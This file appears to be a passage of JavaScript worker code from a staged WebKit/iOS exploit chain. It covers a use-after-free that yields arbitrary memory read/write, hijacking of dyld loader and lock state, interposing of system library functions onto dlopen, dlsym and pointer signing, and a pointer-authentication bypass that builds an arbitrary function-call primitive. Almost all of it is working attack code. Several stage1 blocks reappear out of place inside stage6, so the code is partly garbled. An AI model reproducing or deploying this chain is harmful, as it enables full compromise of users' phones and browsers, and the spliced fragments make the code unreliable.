    const worker2Path = p.makeCString("/System/Library/PrivateFrameworks/PerfPowerServicesReader.framework/PerfPowerServicesReader");
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, worker2Path.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, worker2Path.len);
}
async function stage6() {
    const {
        offsets
    } = p;
    postMessage('check_dlopen2');
    const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x22222222n);
    postMessage(`worker.thread: ${hex(worker.thread)}`);
    const stack_bottom = p.read64(worker.thread + 0x10n);
    worker.stack_bottom = stack_bottom;
    postMessage(`stack_bottom: ${hex(stack_bottom)}`);
    const stack_top = p.read64(worker.thread + 0x18n);
    worker.stack_top = stack_top;
    postMessage(`stack_top: ${hex(stack_top)}`);
    u64[0] = p.dlopen_from_lambda_ret;
    const needle = [u8[0], u8[1], u8[2], u8[3]];
    const search_result = p.efficient_search(stack_top, stack_bottom, needle);
    postMessage(`search_result:${hex(search_result)}`);
    const loader = search_result + 0x78n;
    postMessage(`loader:${hex(loader)}`);
    const metadata = new BigUint64Array(4);
    const metadata_data_ptr = metadata.data();
    postMessage(`metadata_data_ptr:${hex(metadata_data_ptr)}`);
    p.metadata1 = metadata;
    metadata[0] = p.prev_metadata_data_ptr;
    // Same 26.1 free->deallocate->insert path as stage5: store = chunk - (metadata[1]&~3) +
    // oldSize + 0x10 = metadata_data_ptr - (metadata_data_ptr-0xF0) + 9 + 0x10 = 0x109 (= old+0x100).
    // deallocate clears the flag bits BEFORE insert, so insert+0x34 reads [nextAddr+8] where
    // nextAddr = metadata[1]&~3 = metadata_data_ptr-0xF0. Plant an ODD qword there (JS heap,
    // writable -- legal) so insert's merge-write is skipped. metadata[1] bit0 = deallocate's gate.
    const nextAddr = metadata_data_ptr - 0xF0n;
    metadata[1] = (metadata_data_ptr + 0x10n - 0x100n) | 3n;
    p.write64(nextAddr + 0n, metadata_data_ptr);
    p.write64(nextAddr + 8n, 1n);
    postMessage(`[stage6] loader=${hex(loader)} sizeSlot=${hex(p.p_InterposeTupleAll_size)} prev_md=${hex(p.prev_metadata_data_ptr)}; hijack write`);
    // Same frame-offset fix as stage5: the forged vector must sit at lambda0's x19+0x70
    // (needle-0x818), consumed by the epilogue's guarded resize(0) -- needle+0x78 is never read.
    const vecSlot = search_result - 0x818n;
    postMessage(`[stage6] vecSlot(x19+0x70)=${hex(vecSlot)}`);
    p.write64(vecSlot, p.p_InterposeTupleAll_size - 0x10n);
    p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n);
    p.write64(vecSlot + 0x10n, 0n);
    p.write64(loader, p.p_InterposeTupleAll_size - 0x10n);
    p.write64(loader + 8n, metadata_data_ptr + 0x10n);
    postMessage(`[stage6] loader hijacked; rearm atexit/bundle/redirect  NSBundle=${hex(p.TextToSpeech_NSBundle)} rtsLock=${hex(p.runtimeStateLock)}`);
    armAtexitPass(); // keep the 0x100 waiter-count so the libGPUCompilerImplLazy load wakes worker2
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n); // zero the GUARD (+0), not the lock word (+0x20) -- see offset comment
    const gpuPath = p.makeCString(
        "/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImplLazy.dylib"
    );
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, gpuPath.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, gpuPath.len);
    postMessage(`[stage6] rearmed -> loadObjcClass(AVSpeechUtterance)`);
    // the rebuild self-check failed.
    // verify the primitives are correct before we trust them downstream
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.
p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);  // pass-through, no broadcast
p.silentLoad = true;

    await new Promise(r => setTimeout(r, 550));
    
    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechUtterance);
    await new Promise(r => setTimeout(r, 500));
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        p.addrof = rw.addrof;
        p.fakeobj = rw.fakeobj;
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
//    p.write32le(w2pthread + 0xf8n, BigInt(w2.threadPort));              // restore worker2's real token
p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);     // wipe the seed leftover before stage 7

    // verify the primitives are correct before we trust them downstream
    postMessage(`[stage6] loadObjcClass returned; building interpose tuples`);
    let interpose_index = 0;
    function interpose(ptr, val) {
        p.interposingTuples[interpose_index++] = val;
        p.interposingTuples[interpose_index++] = ptr;
    }
    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
    interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        p.addrof = rw.addrof;
        p.fakeobj = rw.fakeobj;
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
    postMessage(`[stage6] tuples built (index=${interpose_index}); spin until InterposeTupleAll.size==old+0x100 (bounded)`);
    // BOUNDED spin: an infinite spin hangs the worker -> WebKit watchdog reaps WebContent (WEBKIT
    // termination / device teardown). Poll a bounded number of times, logging buffer+size so we can
    // see whether worker1's fake-loader wrote the BUFFER and whether worker2 is writing the SIZE.
    // === wake worker2 (UNFUSED): same recipe as worker1's stage5 leg.
    // dyld writes the SIZE inside worker2's own dlopen_from epilogue off the hijacked loader.
    const w2tok = BigInt(worker.threadPort);
    const lockAddr = p.TextToSpeech_NSBundle + structs.NSBundle_lock;
    p.write32le(lockAddr, w2tok);                                   // worker2's stale unlock is legal whenever it fires
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
    pumpSoftlink();          // chain-side synchronous softlink dlopens (this thread)
    postMessage({ type: 'pump_start' });
    // pre-existing interposing state (run 014753: size=9) makes worker2's store land
    // oldSize+0x100, never exactly 0x100 -- compute the target from the CURRENT size.
    const oldSize = p.read64(p.p_InterposeTupleAll_size);
    const wantSize = oldSize + 0x100n;
    postMessage(`[stage6] wake-worker2 baseline: size=${hex(oldSize)} want size=${hex(wantSize)} (= old+0x100, exact 0x100 unreachable via the 4-aligned delta)`);
    let __spins = 0, __sz = 0n, __w = w2tok, __allSpentLogged = false;
    while (true) {
        __sz = p.read64(p.p_InterposeTupleAll_size);
        __w = p.read64(lockAddr) & 0xffffffffn;
        if (__sz === wantSize && __w !== w2tok) break;                // dyld wrote +0x100 AND worker2 cleared the lock
        if (++__spins % 250000 === 0) {
            p.reestablishRead64();   // pump-driven dlopens clobber read64Str's backing
            const __as = p.read64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState);
            if (__as === 0n) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);  // re-arm only from 0
            // PRIMARY wake: NSMapTable redirect (clone-bundle load of a fresh framework, own lock).
            // Fallback every 3M spins: the plant-target sequencer (cursor continues from stage5).
            if (__spins === 250000) {
                await fireNextWakePath(w2tok);
            } else if (__spins % 3000000 === 0) {
                const t = nextWakeTarget();
                if (t) await fireWakeTarget(t, lockAddr, w2tok);
                else {
                    if (!__allSpentLogged) { __allSpentLogged = true; postMessage(`[stage6] ALL wake targets spent -- pump-only from here (lldb if this persists)`); }
                    if (__spins % 3000000 === 0) pumpSoftlink();
                }
            }
            if (__spins % 1000000 === 0) postMessage(`[stage6] wake-worker2 ${__spins}: size=${hex(__sz)} buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} lock=${hex(__w)} atexit=${hex(__as)} (want size=${hex(wantSize)}, lock!=${hex(w2tok)})`);
            if (__spins >= 20000000) {
                postMessage(`[stage6] WAKE TIMEOUT -- no broadcast reached worker2 (seed left in place; crash-safe)`);
                postMessage({ type: 'pump_stop' });
                return;
            }
        }
    }
    postMessage({ type: 'pump_stop' });
    postMessage(`[stage6] spin done (size=${hex(p.read64(p.p_InterposeTupleAll_size))}); reading softlink globals`);
    const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
    postMessage(`[stage6] softLinkMedia=${hex(initMediaAccessibilityMACaptionAppearanceGetDisplayType)}; read PAL_getPKContactClass`);
    const paciza_PAL_initPKContact = p.read64(offsets.WebCore__PAL_getPKContactClass);
    postMessage(`[stage6] paciza_PAL_initPKContact=${hex(paciza_PAL_initPKContact)}; write PKContact patch`);
    p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
    p.write64(offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
    p.write64(offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
    p.write64(offsets.WebCore__initPKContact_value, 0n);
    postMessage(`[stage6] posting sign_pointers`);
    self.postMessage({
        type: 'sign_pointers'
    });
}
async function stage7() {
    const {
        offsets
    } = p;
    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
    postMessage(`paciza_invoker: ${hex(paciza_invoker)}`);
    const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
    postMessage(`paciza_security_invoker_1: ${hex(paciza_security_invoker_1)}`);
    const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
    postMessage(`paciza_security_invoker_2: ${hex(paciza_security_invoker_2)}`);
    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
    postMessage(`paciza_dlopen: ${hex(paciza_dlopen)}`);
    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
    postMessage(`paciza_dlsym: ${hex(paciza_dlsym)}`);
    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
    postMessage(`paciza_signPointer: ${hex(paciza_signPointer)}`);
    const gSecurityd = new BigUint64Array(0x100 / 8);
    const gSecurityd_data_ptr = gSecurityd.data();
    p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
    const slowFcallResult = new BigUint64Array(0x10 / 8);
    const slowFcallResult_data_ptr = slowFcallResult.data();
    slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
    p.slowFcallResult = slowFcallResult;
    const invoker_x0 = new BigUint64Array(0x58);
    const invoker_x0_data_ptr = invoker_x0.data();
    const invoker_arg = new BigUint64Array(0x10);
    const invoker_arg_data_ptr = invoker_arg.data();
    invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
    invoker_arg[0 / 8] = paciza_security_invoker_1;
    invoker_arg[8 / 8] = invoker_x0_data_ptr;
    p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_arg_data_ptr);
    p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_invoker);
    function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
        invoker_arg[0 / 8] = paciza_security_invoker_1;
        gSecurityd[0x78 / 8] = pc;
        invoker_x0[0x28 / 8] = x0;
        invoker_x0[0x30 / 8] = x1;
        invoker_x0[0x38 / 8] = x2;
        return new Promise(r => {
            slow_fcall_resolve = r;
            self.postMessage({
                type: 'slow_fcall'
            });
        });
    }
}
self.onmessage = async function (e) {
    try {
        const data = e.data;

        switch (data.type) {
            case 'stage1': {
                const rw = await acquireRW();
                if (!rw) {
                    postMessage("[stage1] FAILED: reclaim never landed");
                    break;
                }
                if (!buildScribbleRW(rw.addrof, rw.fakeobj)) {
                    postMessage("[stage1] FAILED: could not build scribble R/W");
                    break;
                }
                // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
                // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
                // the rebuild self-check failed.

                if (p.rwRebuildOk) {
                    p.addrof = p.addrofRW;
                    p.fakeobj = p.fakeobjRW;
                    postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
                } else {
                    p.addrof = rw.addrof;
                    p.fakeobj = rw.fakeobj;
                    postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
                }
                // verify the primitives are correct before we trust them downstream
                if (!sanityCheckRW()) {
                    postMessage("[stage1] ABORT: R/W self-test failed");
                    break
                }
                // secure the fakes immediately: turn GC off before yielding to the event loop
                disableGC();
                postMessage("[stage1] arbitrary read64/write64 ready (GC off)");
                // hand off to stage2 (main thread bounces { type: 'stage2' } back)
                postMessage("request_stage2");
                break;
            }

            case 'stage2': {
                await stage2();
                // bridge to the dlopen-worker dance (main thread spawns the helpers)
                postMessage("prepare_dlopen_workers");
                break;
            }

            case 'stage3': {
                await stage3();
                postMessage("dlopen_workers_prepared");
                break;
            }

            case 'stage4': {
                await stage4();
                postMessage("trigger_dlopen_worker1");
                break;
            }
            case 'stage5': {
                // dlopen worker1 is triggered now
                const __ok5 = await stage5();
                if (__ok5 !== false) postMessage("trigger_dlopen_worker2");
                else postMessage("[stage5] worker2 NOT triggered -- worker1 still parked (seed left in place; no crash)");
                break;
            }
            case 'stage6': {
                // dlopen worker2 is triggered now
                await stage6();
                break;
            }
            case 'stage7': {
                // do pac bypass
                await stage7();
                break;
            }
            case 'poll_locks': {
                postMessage('poll_ready');          // ack BEFORE the blocking poll starts
                pollLocks(data);
                break;
            }
            case 'poll_ready': {
                if (p._pollReadyResolve) { const r = p._pollReadyResolve; p._pollReadyResolve = null; r(); }
                break;
            }
        }
    } catch (e) {
        postMessage('[ERROR] ' + e.toString());
    }
};
